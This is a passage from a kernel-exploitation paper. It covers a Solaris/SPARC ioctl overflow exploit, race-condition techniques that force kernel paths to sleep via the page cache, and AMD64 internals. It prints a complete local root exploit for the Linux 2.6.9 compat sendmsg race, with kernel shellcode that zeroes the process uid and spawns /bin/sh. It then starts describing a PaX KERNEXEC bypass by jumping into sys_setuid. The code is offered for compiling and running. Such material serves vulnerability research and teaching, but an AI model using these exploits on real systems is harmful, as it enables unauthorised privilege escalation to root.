#define DUMMY_FILE  "/tmp/test"

int main()
{
        int                     fd;
        int                     ret;
        struct test_comunique   t;
        unsigned long           *pbuf, retaddr, p_addr;

        memset(buf, 'A', BUFSIZ);

        p_addr = getaddr();

        printf("[*] - Using proc_t addr : %p \n", p_addr);

        retaddr = p_addr + UPSARGS_OFFSET + ALIGNPAD;

        printf("[*] - Using ret addr : %p\n", retaddr);

        pbuf = &buf[32];

        pbuf += 2;

        /* locals */

        for ( ret = 0; ret < 14; ret++ )
                *pbuf++ = 0xBBBBBBBB + ret;
        *pbuf++ = SAFE_FP;
        *pbuf = retaddr - 8;

        t.size = sizeof(buf);
        t.addr = buf;

        fd = open(DUMMY_FILE, O_RDONLY);

        ret = ioctl(fd, 1, &t);
        printf("fun %d\n", ret);

        exploit_me();
        close(fd);

}
 
< / >

The exploit is quite simple (we apologies, but we didn't have a public one
to show at time of writing) : 

  - getaddr() uses procfs exported psinfo data to get the proc_t address
    of the running process.

  - the return addr is calculated from proc_t addr + the offset of the
    u_psargs array + the three needed bytes for alignment
 
  - SAFE_FP points just 'somewhere in the data segment' (and ready to be
    biased for the real dereference). Due to SPARC window mechanism we
    have to provide a valid address that it will be used to 'load' the
    saved procedure registers upon re-entering. We don't write on that
    address so whatever readable kernel part is safe. (in more complex 
    scenarios you could have to write over too, so take care). 

  - /tmp/test is just a link to the /devices/pseudo/test@0:0 file      
  
  - the exploit has to be compiled as a 32-bit executable, so that the
    syscall_trap32 offset is meaningful 
  

You can compile and test the driver on your boxes, it's really simple. You
can extend it to test more scenarios, the skeleton is ready for it.


------[ 2.4 - A primer on logical bugs : race conditions


Heap and Stack Overflow (even more, NULL pointer dereference) are 
seldomly found on their own, and, since the automatic and human auditing
work goes on and on, they're going to be even more rare. 
What will probably survive for more time are 'logical bugs', which may
lead, at the end, to a classic overflow. 
Figure out a modelization of 'logical bugs' is, in our opinion, nearly 
impossible, each one is a story on itself.
Notwithstanding this, one typology of those is quite interesting (and
'widespread') and at least some basic approaches to it are suitable for a
generic description. 

We're talking about 'race conditions'. 

In short, we have a race condition everytime we have a small window of
time that we can use to subvert the operating system behaviour. A race
condition is usually the consequence of a forgotten lock or other
syncronization primitive or the use of a variable 'too much time after'
the sanitizing of its value. Just point your favorite vuln database search
engine towards 'kernel race condition' and you'll find many different
examples. 

Winning the race is our goal. This is easier on SMP systems, since the two 
racing threads (the one following the 'raceable kernel path' and the other
competing to win the race) can be scheduled (and be bounded) on different
CPUs. We just need to have the 'racing thread' go faster than the other 
one, since they both can execute in parallel.
Winning a race on UP is harder : we have to force the first kernel path
to sleep (and thus to re-schedule). We have also to 'force' the scheduler
into selecting our 'racing' thread, so we have to take care of scheduling
algorithm implementation (ex. priority based). On a system with a low CPU
load this is generally easy to get : the racing thread is usually
'spinning' on some condition and is likely the best candidate on the
runqueue. 

We're going now to focus more on 'forcing' a kernel path to sleep,
analyzing the nowadays common interface to access files, the page cache. 
After that we'll present the AMD64 architecture and show a real race
exploit for Linux on it, based on the sendmsg [5] vulnerability.
Winning the race in that case turns the vuln into a stack based one, so
the discussion will analize stack based explotation on Linux/AMD64 too.


---[ 2.4.1 - Forcing a kernel path to sleep 

  
If you want to win a race, what's better than slowing down your opponent?
And what's slower than accessing the hard disk, in a modern computer ? 
Operating systems designers know that the I/O over the disk is one of the
major bottleneck on system performances and know aswell that it is one of
the most frequent operations requested. 

Disk accessing and Virtual Memory are closely tied : virtual memory needs
to access the disk to accomplish demand paging and in/out swapping, while
the filesystem based I/O (both direct read/write and memory mapping of
files) works in units of pages and relays on VM functions to perform the
write out of 'dirty' pages. Moreover, to sensibly increase performances,
frequently accessed disk pages are kept in RAM, into the so-called 'Page
Cache'. 

Since RAM isn't an inexhaustible resource, pages to be loaded and 'cached'
into it have to be carefully 'selected'. The first skimming is made by the
'Demand Paging' approach : a page is loaded from disk into memory only
when it is referenced, by the page fault handler code. 
Once a filesystem page is loaded into memory, it enters into the 'Page
Cache' and stays in memory for an unspecified time (depending on disk
activity and RAM availability, generally a LRU policy is used as an
evict-policy). 
Since it's quite common for an userland application to repeatedly access
the same disk content/pages (or for different applications, to access
common files), the 'Page Cache' sensibly increases performances.

One last thing that we have to discuss is the filesystem 'page clustering'.
Another common principle in 'caching' is the 'locality'. Pages near the
referenced one are likely to be accessed in a near future and since we're
accessing the disk we can avoid the future seek-rotation latency if we
load in more pages after the referenced one. How many to load is
determined by the page cluster value. 
On Linux that value is 3, so 2^3 pages are loaded after the referenced
one. On Solaris, if the pages are 8-kb sized, the next eight pages on a
64kb boundary are brought in by the seg_vn driver (mmap-case).

Putting all together, if we want to force a kernel path to sleep we need
to make it reference an un-cached page, so that a 'fault' happens due to
demand paging implementation. The page fault handler needs to perform disk 
I/O, so the process is put to sleep and another one is selected by the
scheduler. Since probably we want aswell our 'controlled contents' to be
at the faulting address we need to mmap the pages, modify them and then
exhaust the page cache before making the kernel re-access them again. 

Filling the 'page cache' has also the effect of consuming a large quantity
of RAM and thus increasing the in/out swapping. On modern operating
systems one can't create a condition of memory pressure only by exhausting
the page cache (as it was possible on very old implementations), since
only some amount of RAM is dedicated to the Page Cache and it would keep
on stealing pages from itself, leaving other subsystems free to perform
well. But we can manage to exhaust those subsystem aswell, for example by
making the kernel do a large amount of 'surviving' slab-allocations. 

Working to put the VM under pressure is something to take always in mind,
since, done that, one can manage to slow down the kernel (favouring races)
and make kmalloc or other allocation function to fail. (A thing that
seldomly happens on normal behaviour). 

It is time, now, for another real life situation. We'll show the sendmsg
[5] vulnerability and exploiting code and we'll describe briefly the AMD64
architectural more exploiting-relevant details.  
   

---[ 2.4.2 - AMD64 and race condition exploiting: sendmsg


AMD64 is the 64-bit 'extension' of the x86 architecture, which is natively
supported. It supports 64-bit registers, pointers/virtual addresses and
integer/logic operations. AMD64 has two primary modes of operation, 'Long
mode', which is the standard 64-bit one (32-bit and 16-bit binaries can be
still run with almost no performance impact, or even, if recompiled, with
some benefit from the extended number of registers, thanks to the
sometimes-called 'compatibility mode') and 'Legacy mode', for 32-bit 
operating systems, which is basically just like having a standard x86
processor environment.

Even if we won't use all of them in the sendmsg exploit, we're going now
to sum a couple of interesting features of the AMD64 architecture :

  - The number of general purpose register has been extended from 8 up to 
    16. The registers are all 64-bit long (referred with 'r[name|num]',
    f.e. rax, r10). Just like what happened when took over the transition
    from 16-bit to 32-bit, the lower 32-bit of general purpose register 
    are accessible with the 'e' prefix (f.e. eax).

  - push/pop on the stack are 64-bit operations, so 8 bytes are
    pushed/popped each time. Pointers are 64-bit too and that allows a
    theorical virtual address space of 2^64 bytes. As happens for the
    UltraSPARC architecture, current implementations address a limited
    virtual address space (2^48 bytes) and thus have a VA-hole (the least
    significant 48 bits are used and bits from 48 up to 63 must be copies
    of bit 47 : the hole is thus between 0x7FFFFFFFFFFF and
    0xFFFF800000000000). 
    This limitation is strictly implementation-dependant, so any future
    implementation might take advantage of the full 2^64 bytes range.  
 
  - It is now possible to reference data relative to the Instruction
    Pointer register (RIP). This is both a good and a bad news, since it
    makes easier writing position independent (shell)code, but also makes
    it more efficient (opening the way for more performant PIE-alike
    implementations)

  - The (in)famous NX bit (bit 63 of the page table entry) is implemented
    and so pages can be marked as No-Exec by the operating system. This is 
    less an issue than over UltraSPARC since actually there's no operating
    system which implements a separated userspace/kernelspace addressing,
    thus leaving open space to the use of the 'return-to-userspace'
    tecnique. 

  - AMD64 doesn't support anymore (in 'long mode') the use of
    segmentation. This choice makes harder, in our opinion, the creation
    of a separated user/kernel address space. Moreover the FS and GS
    registers are still used for different pourposes. As we'll see, the
    Linux Operating System keeps the GS register pointing to the 'current'
    PDA (Per Processor Data Structure). (check : /include/asm-x86_64/pda.h 
    struct x8664_pda .. anyway we'll get back on that in a short).


After this brief summary (if you want to learn more about the AMD64
architecture you can check the reference manuals at [3]) it is time now to
focus over the 'real vulnerability', the sendmsg [5] one : 

"When we copy 32bit ->msg_control contents to kernel, we walk the
same userland data twice without sanity checks on the second pass.
Moreover, if original looks small enough, we end up copying to on-stack
array."
       
< linux-2.6.9/net/compat.c >

int cmsghdr_from_user_compat_to_kern(struct msghdr *kmsg,
                               unsigned char *stackbuf, int stackbuf_size)
{
        struct compat_cmsghdr __user *ucmsg;
        struct cmsghdr *kcmsg, *kcmsg_base;
        compat_size_t ucmlen;
        __kernel_size_t kcmlen, tmp;

        kcmlen = 0;
        kcmsg_base = kcmsg = (struct cmsghdr *)stackbuf;            [1]

[...]

        while(ucmsg != NULL) {
                if(get_user(ucmlen, &ucmsg->cmsg_len))              [2]
                        return -EFAULT;

                /* Catch bogons. */
                if(CMSG_COMPAT_ALIGN(ucmlen) <
                   CMSG_COMPAT_ALIGN(sizeof(struct compat_cmsghdr)))
                        return -EINVAL;
                if((unsigned long)(((char __user *)ucmsg - (char __user
*)kmsg->msg_control)
                                   + ucmlen) > kmsg->msg_controllen) [3]
                        return -EINVAL;

                tmp = ((ucmlen - CMSG_COMPAT_ALIGN(sizeof(*ucmsg))) +
                       CMSG_ALIGN(sizeof(struct cmsghdr)));
                kcmlen += tmp;                                       [4]
                ucmsg = cmsg_compat_nxthdr(kmsg, ucmsg, ucmlen);
        }

[...]

        if(kcmlen > stackbuf_size)                                   [5] 
                kcmsg_base = kcmsg = kmalloc(kcmlen, GFP_KERNEL);

[...]

        while(ucmsg != NULL) {
                __get_user(ucmlen, &ucmsg->cmsg_len);                [6]
                tmp = ((ucmlen - CMSG_COMPAT_ALIGN(sizeof(*ucmsg))) +
                       CMSG_ALIGN(sizeof(struct cmsghdr)));
                kcmsg->cmsg_len = tmp;
                __get_user(kcmsg->cmsg_level, &ucmsg->cmsg_level);
                __get_user(kcmsg->cmsg_type, &ucmsg->cmsg_type);

                /* Copy over the data. */
                if(copy_from_user(CMSG_DATA(kcmsg),                  [7]
                                  CMSG_COMPAT_DATA(ucmsg),
                                  (ucmlen -
CMSG_COMPAT_ALIGN(sizeof(*ucmsg)))))
                        goto out_free_efault;


< / >


As it is said in the advisory, the vulnerability is a double-reference to
some userland data (at [2] and at [6]) without sanitizing the value the
second time it is got from the userland (at [3] the check is performed,
instead). That 'data' is the 'size' of the user-part to copy-in
('ucmlen'), and it's used, at [7], inside the copy_from_user. 

This is a pretty common scenario for a race condition : if we create two
different threads, make the first one enter the codepath and , after [4],
we manage to put it to sleep and make the scheduler choice the other
thread, we can change the 'ucmlen' value and thus perform a 'buffer
overflow'. 

The kind of overflow we're going to perform is 'decided' at [5] : if the
len is little, the buffer used will be in the stack, otherwise it will be
kmalloc'ed. Both the situation are exploitable, but we've chosen the stack
based one (we have already presented a slab exploit for the Linux
operating system before). We're going to use, inside the exploit, the
tecnique we've presented in the subsection before to force a process to
sleep, that is making it access data on a cross page boundary (with the
second page never referenced before nor already swapped in by the page
clustering mechanism) :

+------------+ --------> 0x20020000 [MMAP_ADDR + 32 * PAGE_SIZE] [*]
|            |
| cmsg_len   |           first cmsg_len starts at 0x2001fff4
| cmsg_level |           first struct compat_cmsghdr
| cmsg_type  |
|------------| -------->              0x20020000  [cross page boundary]
| cmsg_len   |           second cmsg_len starts at 0x20020000)
| cmsg_level |           second struct compat_cmsghdr
| cmsg_type  |
|            |
+------------+ --------> 0x20021000

[*] One of those so-called 'runtime adjustement'. The page clustering
    wasn't showing the expected behaviour in the first 32 mmaped-pages,
    while was just working as expected after.


As we said, we're going to perform a stack-based explotation writing past
the 'stackbuf' variable. Let's see where we get it from : 

< linux-2.6.9/net/socket.c > 

asmlinkage long sys_sendmsg(int fd, struct msghdr __user *msg, unsigned
flags)
{
        struct compat_msghdr __user *msg_compat =
        (struct compat_msghdr __user *)msg;
        struct socket *sock;
        char address[MAX_SOCK_ADDR];
        struct iovec iovstack[UIO_FASTIOV], *iov = iovstack;
        unsigned char ctl[sizeof(struct cmsghdr) + 20];
        unsigned char *ctl_buf = ctl;
        struct msghdr msg_sys;
        int err, ctl_len, iov_size, total_len;
[...]

        if ((MSG_CMSG_COMPAT & flags) && ctl_len) {
err = cmsghdr_from_user_compat_to_kern(&msg_sys, ctl, sizeof(ctl));

[...]

< / >

The situation is less nasty as it seems (at least on the systems we tested
the code on) : thanks to gcc reordering the stack variables we get our
'msg_sys' struct placed as if it was the first variable.
That simplifies a lot our exploiting task, since we don't have to take
care of 'emulating' in userspace the structure referenced between our
overflow and the 'return' of the function (for example the struct sock).
Exploiting in this 'second case' would be slightly more complex, but
doable aswell.

The shellcode for the exploit is not much different (as expected, since
the AMD64 is a 'superset' of the x86 architecture) from the ones provided
before for the Linux/x86 environment, netherless we've two focus on two
important different points : the 'thread/task struct dereference' and the
'userspace context switch approach'. 

For the first point, let's start analyzing the get_current()
implementation : 

< linux-2.6.9/include/asm-x86_64/current.h >

#include <asm/pda.h>

static inline struct task_struct *get_current(void)
{
        struct task_struct *t = read_pda(pcurrent);
        return t;
}

#define current get_current()

[...]

#define GET_CURRENT(reg) movq %gs:(pda_pcurrent),reg

< / > 

< linux-2.6.9/include/asm-x86_64/pda.h >

struct x8664_pda {
        struct task_struct *pcurrent;   /* Current process */
        unsigned long data_offset;      /* Per cpu data offset from linker
address */
        struct x8664_pda *me;       /* Pointer to itself */
        unsigned long kernelstack;  /* top of kernel stack for current */
[...]

#define pda_from_op(op,field) ({ \
       typedef typeof_field(struct x8664_pda, field) T__; T__ ret__; \
       switch (sizeof_field(struct x8664_pda, field)) {                 \
case 2: \
asm volatile(op "w %%gs:%P1,%0":"=r"
(ret__):"i"(pda_offset(field)):"memory"); break;\
[...]

#define read_pda(field) pda_from_op("mov",field)
 
< / > 

The task_struct is thus no more into the 'current stack' (more precisely,
referenced from the thread_struct which is actually saved into the
'current stack'), but is stored into the 'struct x8664_pda'. This struct
keeps many information relative to the 'current' process and the CPU it is
running over (kernel stack address, irq nesting counter, cpu it is running
over, number of NMI on that cpu, etc).
As you can see from the 'pda_from_op' macro, during the execution of a
Kernel Path, the address of the 'struct x8664_pda' is kept inside the %gs
register. Moreover, the 'pcurrent' member (which is the one we're actually
interested in) is the first one, so obtaining it from inside a shellcode
is just a matter of doing a : 

	movq %gs:0x0, %rax 

From that point on the 'scanning' to locate uid/gid/etc is just the same
used in the previously shown exploits. 

The second point which quite differs from the x86 case is the 'restore'
part (which is, also, a direct consequence of the %gs using). 
First of all we have to do a '64-bit based' restore, that is we've to push
the 64-bit registers RIP,CC,RFLAGS,RSP and SS and call, at the end, the
'iretq' instruction (the extended version of the 'iret' one on x86).
Just before returning we've to remember to perform the 'swapgs'
instruction, which swaps the %gs content with the one of the KernelGSbase
(MSR address C000_0102h).
If we don't perform the gs restoring, at the next syscall or interrupt the
kernel will use an invalid value for the gs register and will just crash. 

Here's the shellcode in asm inline notation :

void stub64bit()
{
asm volatile (
                "movl %0, %%esi\t\n"
                "movq %%gs:0, %%rax\n"
                "xor %%ecx, %%ecx\t\n"
                "1: cmp $0x12c, %%ecx\t\n"
                "je 4f\t\n"
                "movl (%%rax), %%edx\t\n"
                "cmpl %%esi, %%edx\t\n"
                "jne 3f\t\n"
                "movl 0x4(%%rax),%%edx\t\n"
                "cmp %%esi, %%edx\t\n"
                "jne 3f\t\n"
                "xor %%edx, %%edx\t\n"
                "movl %%edx, 0x4(%%rax)\t\n"
                "jmp 4f\t\n"
                "3: add $4,%%rax\t\n"
                "inc %%ecx\t\n"
                "jmp 1b\t\n"
                "4:\t\n"
                "swapgs\t\n"
                "movq $0x000000000000002b,0x20(%%rsp)\t\n"
                "movq %1,0x18(%%rsp)\t\n"
                "movq $0x0000000000000246,0x10(%%rsp)\t\n"
                "movq $0x0000000000000023,0x8(%%rsp)\t\n"
                "movq %2,0x0(%%rsp)\t\n"
                "iretq\t\n"
                : : "i"(UID), "i"(STACK_OFFSET), "i"(CODE_OFFSET)
                );
}

With UID being the 'uid' of the current running process and STACK_OFFSET
and CODE_OFFSET the address of the stack and code 'segment' we're
returning into in userspace. All those values are taken and patched at
runtime in the exploit 'make_kjump' function : 

< stuff/expl/linux/sracemsg.c > 

#define PAGE_SIZE 0x1000
#define MMAP_ADDR ((void*)0x20000000)
#define MMAP_NULL ((void*)0x00000000)
#define PAGE_NUM 128

#define PATCH_CODE(base,offset,value) \
       *((uint32_t *)((char*)base + offset)) = (uint32_t)(value)

#define fatal_errno(x,y) { perror(x); exit(y); }

struct cmsghdr *g_ancillary;

/* global shared value to sync threads for race */
volatile static int glob_race = 0;

#define UID_OFFSET 1
#define STACK_OFF_OFFSET 69
#define CODE_OFF_OFFSET  95

[...]

int make_kjump(void)
{
  void *stack_map = mmap((void*)(0x11110000), 0x2000,
PROT_READ|PROT_WRITE, MAP_ANONYMOUS|MAP_PRIVATE|MAP_FIXED, 0, 0);
  if(stack_map == MAP_FAILED)
    fatal_errno("mmap", 1);


  void *shellcode_map = mmap(MMAP_NULL, 0x1000,
PROT_READ|PROT_WRITE|PROT_EXEC, MAP_ANONYMOUS|MAP_PRIVATE|MAP_FIXED, 0,
0);
  if(shellcode_map == MAP_FAILED)
    fatal_errno("mmap", 1);

  memcpy(shellcode_map, kernel_stub, sizeof(kernel_stub)-1);

  PATCH_CODE(MMAP_NULL, UID_OFFSET, getuid());
  PATCH_CODE(MMAP_NULL, STACK_OFF_OFFSET, 0x11111111);
  PATCH_CODE(MMAP_NULL, CODE_OFF_OFFSET,  &eip_do_exit);
}

< / > 
 

The rest of the exploit should be quite self-explanatory and we're going
to show the code here after in a short. Note the lowering of the priority
inside start_thread_priority ('nice(19)'), so that we have some more
chance to win the race (the 'glob_race' variable works just like a
spinning lock for the main thread - check 'race_func()').

As a last note, we use the 'rdtsc' (read time stamp counter) instruction
to calculate the time that intercurred while trying to win the race. If
this gap is high it is quite probable that a scheduling happened. 
The task of 'flushing all pages' (inside page cache), so that we'll be
sure that we'll end using demand paging on cross boundary access, is not
implemented inside the code (it could have been easily added) and is left
to the exploit runner. Since we have to create the file with controlled
data, those pages end up cached in the page cache. We have to force the
subsystem into discarding them. It shouldn't be hard for you, if you
followed the discussion so far, to perform tasks that would 'flush the
needed pages' (to disk) or add code to automatize it. (hint : mass find &
cat * > /dev/null is an idea).

Last but not least, since the vulnerable function is inside 'compat.c',
which is the 'compatibility mode' to run 32-bit based binaries, remember to
compile the exploit with the -m32 flag.

< stuff/expl/linux/sracemsg.c >
   
#include <stdio.h>
#include <signal.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <sched.h>
#include <sys/socket.h>

#define PAGE_SIZE 0x1000
#define MMAP_ADDR ((void*)0x20000000)
#define MMAP_NULL ((void*)0x00000000)
#define PAGE_NUM 128

#define PATCH_CODE(base,offset,value) \
       *((uint32_t *)((char*)base + offset)) = (uint32_t)(value)

#define fatal_errno(x,y) { perror(x); exit(y); }

struct cmsghdr *g_ancillary;

/* global shared value to sync threads for race */
volatile static int glob_race = 0;

#define UID_OFFSET 1
#define STACK_OFF_OFFSET 69
#define CODE_OFF_OFFSET  95

char kernel_stub[] =

"\xbe\xe8\x03\x00\x00"                   //  mov    $0x3e8,%esi
"\x65\x48\x8b\x04\x25\x00\x00\x00\x00"   //  mov    %gs:0x0,%rax
"\x31\xc9"                               //  xor    %ecx,%ecx  (15
"\x81\xf9\x2c\x01\x00\x00"               //  cmp    $0x12c,%ecx
"\x74\x1c"                               //  je     400af0
<stub64bit+0x38>
"\x8b\x10"                               //  mov    (%rax),%edx
"\x39\xf2"                               //  cmp    %esi,%edx
"\x75\x0e"                               //  jne    400ae8
<stub64bit+0x30>
"\x8b\x50\x04"                           //  mov    0x4(%rax),%edx
"\x39\xf2"                               //  cmp    %esi,%edx
"\x75\x07"                               //  jne    400ae8
<stub64bit+0x30>
"\x31\xd2"                               //  xor    %edx,%edx
"\x89\x50\x04"                           //  mov    %edx,0x4(%rax)
"\xeb\x08"                               //  jmp    400af0
<stub64bit+0x38>
"\x48\x83\xc0\x04"                       //  add    $0x4,%rax
"\xff\xc1"                               //  inc    %ecx
"\xeb\xdc"                               //  jmp    400acc
<stub64bit+0x14>
"\x0f\x01\xf8"                           //  swapgs (54
"\x48\xc7\x44\x24\x20\x2b\x00\x00\x00"   //  movq   $0x2b,0x20(%rsp)
"\x48\xc7\x44\x24\x18\x11\x11\x11\x11"   //  movq   $0x11111111,0x18(%rsp)
"\x48\xc7\x44\x24\x10\x46\x02\x00\x00"   //  movq   $0x246,0x10(%rsp)
"\x48\xc7\x44\x24\x08\x23\x00\x00\x00"   //  movq   $0x23,0x8(%rsp)  /* 23
32-bit , 33 64-bit cs */
"\x48\xc7\x04\x24\x22\x22\x22\x22"       //  movq   $0x22222222,(%rsp)
"\x48\xcf";                              //  iretq


void eip_do_exit(void)
{
  char *argvx[] = {"/bin/sh", NULL};
  printf("uid=%d\n", geteuid());
  execve("/bin/sh", argvx, NULL);
  exit(1);
}


/*
 * This function maps stack and code segment
 * - 0x0000000000000000 - 0x0000000000001000   (future code space)
 * - 0x0000000011110000 - 0x0000000011112000   (future stack space)
 */

int make_kjump(void)
{
  void *stack_map = mmap((void*)(0x11110000), 0x2000,
PROT_READ|PROT_WRITE, MAP_ANONYMOUS|MAP_PRIVATE|MAP_FIXED, 0, 0);
  if(stack_map == MAP_FAILED)
    fatal_errno("mmap", 1);


  void *shellcode_map = mmap(MMAP_NULL, 0x1000,
PROT_READ|PROT_WRITE|PROT_EXEC, MAP_ANONYMOUS|MAP_PRIVATE|MAP_FIXED, 0,
0);
  if(shellcode_map == MAP_FAILED)
    fatal_errno("mmap", 1);

  memcpy(shellcode_map, kernel_stub, sizeof(kernel_stub)-1);

  PATCH_CODE(MMAP_NULL, UID_OFFSET, getuid());
  PATCH_CODE(MMAP_NULL, STACK_OFF_OFFSET, 0x11111111);
  PATCH_CODE(MMAP_NULL, CODE_OFF_OFFSET,  &eip_do_exit);
}

int start_thread_priority(int (*f)(void *), void* arg)
{
  char *stack = malloc(PAGE_SIZE*4);
  int tid = clone(f, stack + PAGE_SIZE*4 -4,
CLONE_FS|CLONE_FILES|CLONE_SIGHAND|CLONE_VM, arg);
  if(tid < 0)
  fatal_errno("clone", 1);

  nice(19);
  sleep(1);
  return tid;
}

int race_func(void* noarg)
{
  printf("[*] thread racer getpid()=%d\n", getpid());
  while(1)
  {
    if(glob_race)
    {
      g_ancillary->cmsg_len = 500;
      return;
    }
  }
}

uint64_t tsc()
{
  uint64_t ret;
  asm volatile("rdtsc" : "=A"(ret));

  return ret;
}

struct tsc_stamp
{
  uint64_t before;
  uint64_t after;
  uint32_t access;
};

struct tsc_stamp stamp[128];

inline char *flat_file_mmap(int fs)
{
  void *addr = mmap(MMAP_ADDR, PAGE_SIZE*PAGE_NUM, PROT_READ|PROT_WRITE,
MAP_SHARED|MAP_FIXED, fs, 0);
  if(addr == MAP_FAILED)
    fatal_errno("mmap", 1);
  return (char*)addr;
}

void scan_addr(char *memory)
{
  int i;
  for(i=1; i<PAGE_NUM-1; i++)
  {
    stamp[i].access = (uint32_t)(memory + i*PAGE_SIZE);
    uint32_t dummy = *((uint32_t *)(memory + i*PAGE_SIZE-4));
    stamp[i].before = tsc();
    dummy = *((uint32_t *)(memory + i*PAGE_SIZE));
    stamp[i].after  = tsc();

  }
}

/* make code access first 32 pages to flush page-cluster */
/* access: 0x20000000 - 0x2000XXXX */

void start_flush_access(char *memory, uint32_t page_num)
{
  int i;
  for(i=0; i<page_num; i++)
  {
    uint32_t dummy = *((uint32_t *)(memory + i*PAGE_SIZE));
  }
}


void print_single_result(struct tsc_stamp *entry)
{
  printf("Accessing: %p, tsc-difference: %lld\n", entry->access,
entry->after - entry->before);
}


void print_result()
{
  int i;
  for(i=1; i<PAGE_NUM-1; i++)
  {
    printf("Accessing: %p, tsc-difference: %lld\n", stamp[i].access,
stamp[i].after - stamp[i].before);
  }
}


void fill_ancillary(struct msghdr *msg, char *ancillary)
{
  msg->msg_control = ((ancillary + 32*PAGE_SIZE) - sizeof(struct
cmsghdr));
  msg->msg_controllen = sizeof(struct cmsghdr) * 2;

  /* set global var thread race ancillary data chunk */
  g_ancillary = msg->msg_control;

  struct cmsghdr* tmp = (struct cmsghdr *)(msg->msg_control);
  tmp->cmsg_len   = sizeof(struct cmsghdr);
  tmp->cmsg_level = 0;
  tmp->cmsg_type  = 0;
  tmp++;

  tmp->cmsg_len   = sizeof(struct cmsghdr);
  tmp->cmsg_level = 0;
  tmp->cmsg_type  = 0;
  tmp++;

  memset(tmp, 0x00, 172);
}

int main()
{
  struct tsc_stamp single_stamp = {0};
  struct msghdr msg = {0};

  memset(&stamp, 0x00, sizeof(stamp));
  int fd = open("/tmp/file", O_RDWR);
  if(fd == -1)
    fatal_errno("open", 1);

  char *addr = flat_file_mmap(fd);

  fill_ancillary(&msg, addr);

  munmap(addr, PAGE_SIZE*PAGE_NUM);
  close(fd);
  make_kjump();
  sync();

  printf("Flush all pages and press a enter:)\n");
  getchar();

  fd = open("/tmp/file", O_RDWR);
  if(fd == -1)
    fatal_errno("open", 1);
  addr = flat_file_mmap(fd);

  int t_pid = start_thread_priority(race_func, NULL);
  printf("[*] thread main getpid()=%d\n", getpid());

  start_flush_access(addr, 32);


  int sc[2];
  int sp_ret = socketpair(AF_UNIX, SOCK_STREAM, 0, sc);
  if(sp_ret < 0)
    fatal_errno("socketpair", 1);

  single_stamp.access = (uint32_t)g_ancillary;
  single_stamp.before = tsc();

  glob_race =1;
  sendmsg(sc[0], &msg, 0);

  single_stamp.after = tsc();

  print_single_result(&single_stamp);

  kill(t_pid, SIGKILL);
  munmap(addr, PAGE_SIZE*PAGE_NUM);
  close(fd);
  return 0;
}

< / > 


------[ 3 - Advanced scenarios 


In an attempt to ''complete'' our tractation on kernel exploiting we're
now going to discuss two 'advanced scenarios' : a stack based kernel
exploit capable to bypass PaX [18] KERNEXEC and Userland / Kernelland
split and an effective remote exploit, both for the Linux kernel. 


---[ 3.1 - PaX KERNEXEC & separated kernel/user space


The PaX KERNEXEC option emulates a no-exec bit for pages at kernel land
on an architecture which hasn't it (x86), while the User / Kerne Land
split blocks the 'return-to-userland' approach that we have extensively
described and used in the paper. With those two protections active we're
basically facing the same scenario we encountered discussing the 
Solaris/SPARC environment, so we won't go in more details here (to avoid
duplicating the tractation). 

This time, thou, we won't have any executable and controllable memory area
(no u_psargs array), and we're going to present a different tecnique which
doesn't require to have one. Even if the idea behind applyes well to any
no-exec and separated kernel/userspace environment, as we'll see in a
short, this approach is quite architectural (stack management and function
call/return implementation) and Operating System (handling of credentials)
specific. 

Moreover, it requires a precise knowledge of the .text layout of the
running kernel, so at least a readable image (which is a default situation
on many distros, on Solaris, and on other operating systems we checked) or
a large or controlled infoleak is necessary. 

The idea behind is not much different from the theory behind
'ret-into-libc' or other userland exploiting approaches that attempt to
circumvent the non executability of heap and stack : as we know, Linux
associates credentials to each process in term of numeric values :

< linux-2.6.15/include/linux/sched.h >

struct task_struct {
[...]
/* process credentials */
        uid_t uid,euid,suid,fsuid;
        gid_t gid,egid,sgid,fsgid;
[...]
}

< / > 

Sometimes a process needs to raise (or drop, for security reasons) its
credentials, so the kernel exports systemcalls to do that. 
One of those is sys_setuid :

< linux-2.6.15/kernel/sys.c >

asmlinkage long sys_setuid(uid_t uid)
{
        int old_euid = current->euid;
        int old_ruid, old_suid, new_ruid, new_suid;
        int retval;

        retval = security_task_setuid(uid, (uid_t)-1, (uid_t)-1,
LSM_SETID_ID);
        if (retval)
                return retval;

        old_ruid = new_ruid = current->uid;
        old_suid = current->suid;
        new_suid = old_suid;

        if (capable(CAP_SETUID)) {              [1]
                if (uid != old_ruid && set_user(uid, old_euid != uid) < 0)
                        return -EAGAIN;
                new_suid = uid;
        } else if ((uid != current->uid) && (uid != new_suid))
                return -EPERM;

        if (old_euid != uid)
        {
                current->mm->dumpable = suid_dumpable;
                smp_wmb();
        }
        current->fsuid = current->euid = uid;    [2] 
        current->suid = new_suid;

        key_fsuid_changed(current);
        proc_id_connector(current, PROC_EVENT_UID);

        return security_task_post_setuid(old_ruid, old_euid, old_suid,
LSM_SETID_ID);
}

< / > 

As you can see, the 'security' checks (out of the LSM security_* entry
points) are performed at [1] and after those, at [2] the values of fsuid
and euid are set equal to the value passed to the function. 
sys_setuid is a system call, so, due to systemcall convention, parameters
are passed in register. More precisely, 'uid' will be passed in '%ebx'. 
The idea is so simple (and not different from 'ret-into-libc' [19] or 
other userspace page protection evading tecniques like [20]), if we manage
to have 0 into %ebx and to jump right in the middle of sys_setuid (and
right after the checks) we should be able to change the 'euid' and 'fsuid'
of our process and thus raise our priviledges. 

Let's see the sys_setuid disassembly to better tune our idea :

[...]
c0120fd0:       b8 00 e0 ff ff          mov    $0xffffe000,%eax  [1]
c0120fd5:       21 e0                   and    %esp,%eax
c0120fd7:       8b 10                   mov    (%eax),%edx
c0120fd9:       89 9a 6c 01 00 00       mov    %ebx,0x16c(%edx)  [2]
c0120fdf:       89 9a 74 01 00 00       mov    %ebx,0x174(%edx)
c0120fe5:       8b 00                   mov    (%eax),%eax
c0120fe7:       89 b0 70 01 00 00       mov    %esi,0x170(%eax)
c0120fed:       6a 01                   push   $0x1
c0120fef:       8b 44 24 04             mov    0x4(%esp),%eax
c0120ff3:       50                      push   %eax
c0120ff4:       55                      push   %ebp
c0120ff5:       57                      push   %edi
c0120ff6:       e8 65 ce 0c 00          call   c01ede60
c0120ffb:       89 c2                   mov    %eax,%edx
c0120ffd:       83 c4 10                add    $0x10,%esp        [3]  
c0121000:       89 d0                   mov    %edx,%eax
c0121002:       5e                      pop    %esi
c0121003:       5b                      pop    %ebx
c0121004:       5e                      pop    %esi
c0121005:       5f                      pop    %edi
c0121006:       5d                      pop    %ebp
c0121007:       c3                      ret


